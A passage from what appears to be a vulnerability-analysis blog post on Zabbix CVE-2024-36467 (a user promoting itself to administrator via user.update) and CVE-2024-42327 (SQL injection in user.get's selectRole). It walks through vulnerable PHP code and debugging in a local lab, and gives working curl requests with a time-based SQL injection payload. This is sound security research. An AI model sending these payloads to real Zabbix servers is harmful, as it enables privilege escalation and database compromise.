+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;jsonrpc&#34;</span>: <span style="color:#e6db74">&#34;2.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;method&#34;</span>: <span style="color:#e6db74">&#34;user.update&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;params&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;userid&#34;</span>: <span style="color:#ae81ff">3</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;usrgrps&#34;</span>: [
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;usrgrpid&#34;</span>: <span style="color:#e6db74">&#34;7&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;auth&#34;</span>: <span style="color:#e6db74">&#34;7f27bc8244c0f417644a461c2565308d&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></td>
+<td>
+<p>Returns <code>userid</code> on success</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#960050;background-color:#1e0010">OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Powered-By:</span> <span style="color:#960050;background-color:#1e0010">PHP/</span><span style="color:#ae81ff">8.3</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Access-Control-Allow-Origin:</span> <span style="color:#960050;background-color:#1e0010">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Access-Control-Allow-Headers:</span> <span style="color:#960050;background-color:#1e0010">Content-Type</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Access-Control-Allow-Methods:</span> <span style="color:#960050;background-color:#1e0010">POST</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Access-Control-Max-Age:</span> <span style="color:#ae81ff">1000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length:</span> <span style="color:#ae81ff">51</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">application/json</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;jsonrpc&#34;</span>: <span style="color:#e6db74">&#34;2.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;result&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;userids&#34;</span>: [
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;3&#34;</span>
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></td>
+</tr>
+</table>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="table">Adding User To<span style="font-family: Courier; font-weight: 600"> Zabbix administrators </span>Group<br><br></span>
+<p>To see this exploit in action, set a breakpoint at<span style="font-family: Courier; font-weight: 600"> include/classes/api/services/CUser.php:359 </span>, start the debugger (if not already) and run the following bash command (same as request in Table 5):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST <span style="color:#e6db74">&#34;http://localhost/api_jsonrpc.php&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;jsonrpc&#34;: &#34;2.0&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;method&#34;: &#34;user.update&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;params&#34;: {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &#34;userid&#34;: 3,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &#34;usrgrps&#34;: [
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &#34;usrgrpid&#34;: &#34;7&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      ]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    },
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;id&#34;: 1,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;auth&#34;: &#34;7f27bc8244c0f417644a461c2565308d&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  }&#39;</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">CVE-2024-36467 Payload<br><br></span>
+<p>Alternatively, you may also send the request from Table 5 using the Burpsuite repeater to trigger the breakpoint. From here on out just simply step in / step over functions to see the code flow.</p>
+<p><img class="center" alt="vscode-debug-cve-2024-36467-1" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/vscode-debug-cve-2024-36467-1.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Start of<span style="font-family: Courier; font-weight: 600"> user.update</span><br><br></span></p>
+<p>Eventually, you will see that this request is accepted, and the changes are committed to the database at<span style="font-family: Courier; font-weight: 600"> include/classes/api/clients/CLocalApiClient.php:130</span>.</p>
+<p><img class="center" alt="vscode-debug-cve-2024-36467-2" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/vscode-debug-cve-2024-36467-2.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Committing User Group Update<br><br></span></p>
+<p>Indeed, our user is now part of the <code>Zabbix administrators</code> group as seen from the admin web portal!</p>
+<p><img class="center" alt="zabbix-cve-2024-36467-poc" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/zabbix-cve-2024-36467-poc.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Verifying CVE-2024-36467<br><br></span></p>
+<p><img class="center" alt="cyberpunk" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/celebrating.gif"><br></p>
+<p>Before we start celebrating and get ahead of ourselves, do remember to revert group changes so that we can keep our testing consistent.</p>
+<h2 id="5-cve-2024-42327">5. CVE-2024-42327</h2>
+<p>According to <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42327">NIST</a></p>
+<blockquote>
+<p><b><em>&ldquo;A non-admin user account on the Zabbix frontend with the default User role, or with any other role that gives API access can exploit this vulnerability. An SQLi exists in the CUser class in the addRelatedObjects function, this function is being called from the CUser.get function which is available for every user who has API access.&rdquo;</em></b></p>
+</blockquote>
+<p>And you would think by now, developers would have learned to use SQL prepared statements for any queries right?</p>
+<p><img class="center" alt="anakin-meme" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/anakin-meme.png" width="500" height="500"><br></p>
+<h3 id="51-static-analysis">5.1 Static Analysis</h3>
+<p>Let&rsquo;s work backwards this time. The root cause of the vulnerability comes from <span style="font-family: Courier; font-weight: 600"> CUser::addRelatedObjects() </span>at lines 3046 - 3050 of<span style="font-family: Courier; font-weight: 600"> include/classes/api/services/CUser.php</span>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">25</span>      <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CUser</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">CApiService</span> {
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>      
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2969</span>        <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">addRelatedObjects</span>(<span style="color:#66d9ef">array</span> $options, <span style="color:#66d9ef">array</span> $result) {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3040</span>          <span style="color:#75715e">// adding user role
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">3041</span>          <span style="color:#66d9ef">if</span> ($options[<span style="color:#e6db74">&#39;selectRole&#39;</span>] <span style="color:#f92672">!==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> $options[<span style="color:#e6db74">&#39;selectRole&#39;</span>] <span style="color:#f92672">!==</span> <span style="color:#a6e22e">API_OUTPUT_COUNT</span>) {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3042</span>              <span style="color:#66d9ef">if</span> ($options[<span style="color:#e6db74">&#39;selectRole&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#a6e22e">API_OUTPUT_EXTEND</span>) {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3043</span>                  $options[<span style="color:#e6db74">&#39;selectRole&#39;</span>] <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;roleid&#39;</span>, <span style="color:#e6db74">&#39;name&#39;</span>, <span style="color:#e6db74">&#39;type&#39;</span>, <span style="color:#e6db74">&#39;readonly&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3044</span>              }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3045</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3046</span>              $db_roles <span style="color:#f92672">=</span> <span style="color:#a6e22e">DBselect</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3047</span>                  <span style="color:#e6db74">&#39;SELECT u.userid&#39;</span><span style="color:#f92672">.</span>($options[<span style="color:#e6db74">&#39;selectRole&#39;</span>] <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;,r.&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;,r.&#39;</span>, $options[<span style="color:#e6db74">&#39;selectRole&#39;</span>]) <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3048</span>                  <span style="color:#e6db74">&#39; FROM users u,role r&#39;</span><span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3049</span>                  <span style="color:#e6db74">&#39; WHERE u.roleid=r.roleid&#39;</span><span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3050</span>                  <span style="color:#e6db74">&#39; AND &#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">dbConditionInt</span>(<span style="color:#e6db74">&#39;u.userid&#39;</span>, $userIds)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3051</span>              );
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Vulnerable Snippet of <span style="font-family: Courier; font-weight: 600"> CUser::addRelatedObjects() </span><br><br></span>
+<p>The main issue stems from <span style="font-family: Courier; font-weight: 600"> CUser::addRelatedObjects() </span>calling<span style="font-family: Courier; font-weight: 600"> implode() </span>on the <code>$options['selectRole']</code> array, which adds a <code>,r.</code> prefix for each value in the array, then concatenating them as a string as part of the SQL query.</p>
+<p>We can also do a simple test to see what the expected output of<span style="font-family: Courier; font-weight: 600"> implode() </span>is by running this short snippet in the PHP interactive shell of our <em>zabbix-frontend</em> container. As the <code>$options['selectRole']</code> array only expects values such as <code>roleid</code>, <code>name</code>, <code>type</code> and <code>readonly</code>, we will first inspect what the expected output looks like with legitimate values.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">┌──</span>(<span style="color:#a6e22e">gerald㉿kali</span>)<span style="color:#f92672">-</span>[<span style="color:#f92672">~/</span><span style="color:#a6e22e">Desktop</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Experiments</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Zabbix</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">└─</span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">docker</span> <span style="color:#a6e22e">exec</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">it</span> <span style="color:#a6e22e">zabbix</span><span style="color:#f92672">-</span><span style="color:#a6e22e">frontend</span> <span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">a</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> $options[<span style="color:#e6db74">&#39;selectRole&#39;</span>] <span style="color:#f92672">=</span> [ <span style="color:#e6db74">&#39;name&#39;</span>, <span style="color:#e6db74">&#39;roleid&#39;</span> ];
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> $test <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;,r.&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;,r.&#39;</span>, $options[<span style="color:#e6db74">&#39;selectRole&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">echo</span> $test;
+</span></span><span style="display:flex;"><span>,<span style="color:#a6e22e">r</span><span style="color:#f92672">.</span><span style="color:#a6e22e">name</span>,<span style="color:#a6e22e">r</span><span style="color:#f92672">.</span><span style="color:#a6e22e">roleid</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Testing <span style="font-family: Courier; font-weight: 600"> implode() </span> Output on Valid Fields<br><br></span>
+<p>Looking back at the function definition for <span style="font-family: Courier; font-weight: 600"> CUser::addRelatedObjects()</span>, there are also no additional sanitization for <code>$options['selectRole']</code>, which we can control. In other words, we are able to do stupid things like appending SQL queries such as <code>AND (SELECT(SLEEP(5)))</code> in any of the fields.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> $options[<span style="color:#e6db74">&#39;selectRole&#39;</span>] <span style="color:#f92672">=</span> [ <span style="color:#e6db74">&#39;name&#39;</span>, <span style="color:#e6db74">&#39;roleid AND (SELECT(SLEEP(5)))&#39;</span> ];
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> $test <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;,r.&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;,r.&#39;</span>, $options[<span style="color:#e6db74">&#39;selectRole&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">echo</span> $test;
+</span></span><span style="display:flex;"><span>,<span style="color:#a6e22e">r</span><span style="color:#f92672">.</span><span style="color:#a6e22e">name</span>,<span style="color:#a6e22e">r</span><span style="color:#f92672">.</span><span style="color:#a6e22e">roleid</span> <span style="color:#66d9ef">AND</span> (<span style="color:#a6e22e">SELECT</span>(<span style="color:#a6e22e">SLEEP</span>(<span style="color:#ae81ff">5</span>)))
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Appending SQL Injection in Valid Field<br><br></span>
+<p>Now the real question is, which API method should we call to reach this vulnerable code branch? Looking for references to<span style="font-family: Courier; font-weight: 600"> CUser::addRelatedObjects()</span>, there exists only one such occurence in <span style="font-family: Courier; font-weight: 600"> CUser::get() </span>at line 234 of <span style="font-family: Courier; font-weight: 600"> include/classes/api/services/CUser.php </span></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">25</span>      <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CUser</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">CApiService</span> {
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>      
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">68</span>          <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get</span>($options <span style="color:#f92672">=</span> []) {
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">233</span>             <span style="color:#66d9ef">if</span> ($result) {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">234</span>                 $result <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">addRelatedObjects</span>($options, $result);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">235</span>             }
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Reference To <span style="font-family: Courier; font-weight: 600"> CUser::addRelatedObjects()</span><br><br></span>
+<p><span style="font-family: Courier; font-weight: 600"> CUser::addRelatedObjects() </span>is only called if <code>$result</code> is not null or not empty. In other words, we have to know how <code>$result</code> is being written to or initialized. In the listing below, we can see that <code>$result</code> is initialized at either line 198 or line 203. If <code>countOutput</code> is specified as part of the request parameters, then it returns <code>$result</code> - something which we want to avoid.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">25</span>      <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CUser</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">CApiService</span> {
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>      
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">68</span>          <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get</span>($options <span style="color:#f92672">=</span> []) {
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">194</span>             <span style="color:#66d9ef">while</span> ($user <span style="color:#f92672">=</span> <span style="color:#a6e22e">DBfetch</span>($res)) {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">195</span>                 <span style="color:#a6e22e">unset</span>($user[<span style="color:#e6db74">&#39;passwd&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">196</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">197</span>                 <span style="color:#66d9ef">if</span> ($options[<span style="color:#e6db74">&#39;countOutput&#39;</span>]) {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">198</span>                     $result <span style="color:#f92672">=</span> $user[<span style="color:#e6db74">&#39;rowscount&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">199</span>                 }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>                 <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">201</span>                     $userIds[$user[<span style="color:#e6db74">&#39;userid&#39;</span>]] <span style="color:#f92672">=</span> $user[<span style="color:#e6db74">&#39;userid&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">202</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">203</span>                     $result[$user[<span style="color:#e6db74">&#39;userid&#39;</span>]] <span style="color:#f92672">=</span> $user;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">204</span>                 }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">205</span>             }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">206</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">207</span>             <span style="color:#66d9ef">if</span> ($options[<span style="color:#e6db74">&#39;countOutput&#39;</span>]) {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">208</span>                 <span style="color:#66d9ef">return</span> $result;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">209</span>             }
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Initializing<span style="font-family: Courier; font-weight: 600"> $result </span><br><br></span>
+<p>If you are already lost in this jungle of code, here&rsquo;s what I&rsquo;m trying to say.</p>
+<p>This vulnerability can only be triggered by the <code>user.get</code> method, without specifying <code>countOutput</code> as part of our request parameters, querying for a <code>userid</code> that we have access to (a.k.a our own user duh!) and also specifying the SQL injection payload in <code>selectRole</code>.</p>
+<h3 id="52-dynamic-analysis">5.2 Dynamic Analysis</h3>
+<p>The request in Table 6 shows the time-based SQL injection payload in our JSON body for <code>user.get</code> method. A successful time-based SQL injection will result in our querying sleeping for 5 seconds unconditionally.</p>
+<table>
+<tr>
+<th style="text-align: center;">Request</th>
+<th style="text-align: center;">Response</th>
+</tr>
+<tr>
+<td>
+<p>Our <code>userid</code> is 3. Why? Recall <a href="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/#table4">Section 3.2 Table 4</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">POST</span> <span style="color:#960050;background-color:#1e0010">/api_jsonrpc.php</span> <span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Host:</span> <span style="color:#960050;background-color:#1e0010">localhost</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">application/json</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;jsonrpc&#34;</span>: <span style="color:#e6db74">&#34;2.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;method&#34;</span>: <span style="color:#e6db74">&#34;user.get&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;params&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;selectRole&#34;</span>: [
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;name&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;roleid AND (SELECT(SLEEP(5)))&#34;</span>
+</span></span><span style="display:flex;"><span>        ],
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;userids&#34;</span>: [
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;3&#34;</span>
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;auth&#34;</span>: <span style="color:#e6db74">&#34;7f27bc8244c0f417644a461c2565308d&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></td>
+<td>
+<p><em>Response time is &gt; 5 seconds</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#960050;background-color:#1e0010">OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">application/json</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;jsonrpc&#34;</span>: <span style="color:#e6db74">&#34;2.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;result&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;userid&#34;</span>: <span style="color:#e6db74">&#34;3&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;user&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;role&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;User role&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ],
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></td>
+</tr>
+</table>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="table">Time-Based SQL Injection<br><br></span>
+<p>The following shows the bash commands for making the request in Table 6 while also getting the start timestamp and end timestamp of this request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>date +%3s; curl -X POST http://localhost/api_jsonrpc.php <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;jsonrpc&#34;: &#34;2.0&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;method&#34;: &#34;user.get&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;params&#34;: {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;selectRole&#34;: [
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &#34;name&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &#34;roleid AND (SELECT(SLEEP(5)))&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ],
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;userids&#34;: [
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &#34;3&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    },
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;id&#34;: 1,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;auth&#34;: &#34;7f27bc8244c0f417644a461c2565308d&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}&#39;</span>; echo <span style="color:#e6db74">&#34;&#34;</span>; date +%3s;
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">CVE-2024-42327 Payload<br><br></span>
+<p>If you&rsquo;ve already copy-pasted this curl command, you should have gotten a ~5 seconds response time.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#ae81ff">1765238756</span>
